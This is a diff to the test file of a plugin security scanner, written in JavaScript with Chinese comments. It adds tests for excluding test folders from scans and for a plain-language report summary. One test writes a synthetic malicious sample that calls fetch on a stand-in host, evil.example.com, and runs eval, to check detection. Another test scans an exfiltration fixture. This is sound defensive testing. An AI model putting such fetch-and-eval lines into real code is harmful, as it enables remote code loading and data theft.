@@ -13,10 +13,10 @@ import { v1Rules } from '../dist/index.js';
 const here = dirname(fileURLToPath(import.meta.url));
 const fixtures = join(here, '..', 'fixtures');
 
-/** 扫描一个夹具目录，返回报告 */
+/** 扫描一个夹具目录，返回报告（fixtures 目录本身会被默认 excludeTests 排除，这里显式关闭） */
 async function auditFixture(name) {
   const root = join(fixtures, name);
-  return scan({ root, sourceLabel: name }, v1Rules);
+  return scan({ root, sourceLabel: name, excludeTests: false }, v1Rules);
 }
 
 /** 报告中的 threatId 集合 */
@@ -158,4 +158,41 @@ test('allowlist: default allowlist downgrades harness-pet T03 (real plugin)', as
   const t03 = r.findings.filter((f) => f.threatId === 'T03');
   // 默认白名单将 harness-pet 的 T03 降级为 info
   assert.ok(t03.every((f) => f.severity === 'info'), 'harness-pet T03 should be downgraded by default allowlist');
+});
+
+// ---------------------------------------------------------------- excludeTests + plain summary
+test('excludeTests: default true skips tests/fixtures dirs', async () => {
+  // dsh-plugin-audit 有 tests/ 目录；默认排除后不应命中它的测试夹具
+  const real = 'C:/Users/gojo/.dsh/profiles/web/node_modules/harness-pet';
+  // 用 fixtures/malicious/exfil 的"tests 内恶意样本"构造：把 malicious/exfil 当普通插件扫，
+  // 其中无 tests 目录——改用真实 dsh-plugin-audit 太依赖网络。这里验证语义：
+  // 扫描一个含 tests 目录的合成目录（临时在 fixtures 里造一个）
+  const { mkdtemp, writeFile, mkdir, rm } = await import('node:fs/promises');
+  const { tmpdir } = await import('node:os');
+  const dir = await mkdtemp(join(tmpdir(), 'dsh-safety-xtest-'));
+  try {
+    await mkdir(join(dir, 'tests'), { recursive: true });
+    await writeFile(join(dir, 'index.js'), 'export function apply(ctx) {}');
+    await writeFile(join(dir, 'tests', 'evil.js'), 'fetch("https://evil.example.com/x"); eval("1")');
+    // 默认（排除 tests）→ 0 review
+    const r1 = await scan({ root: dir, sourceLabel: 'xtest' }, v1Rules);
+    assert.ok(!threatIds(r1).has('T04'), 'tests dir must be excluded by default');
+    // 显式不排除 → 命中 T04
+    const r2 = await scan({ root: dir, sourceLabel: 'xtest', excludeTests: false }, v1Rules);
+    assert.ok(threatIds(r2).has('T04'), 'excludeTests:false must include tests dir');
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
+});
+
+test('plain summary: renders human-readable conclusion', async () => {
+  const { renderPlainSummary } = await import('../dist/index.js');
+  const r = await auditFixture('malicious/exfil');
+  const plain = renderPlainSummary(r);
+  assert.ok(plain.includes('大白话'), 'plain summary should be labeled');
+  assert.ok(plain.includes('结论'), 'plain summary should have a verdict');
+  assert.ok(plain.includes('T06') || plain.includes('密钥'), 'plain summary should explain threats in plain words');
+  // 报告输出结构：MCP/CLI 输出 = 报告 + 白话（验证两者都可用）
+  const { renderMarkdown } = await import('../dist/index.js');
+  assert.ok(renderMarkdown(r).includes('权限画像'));
 });
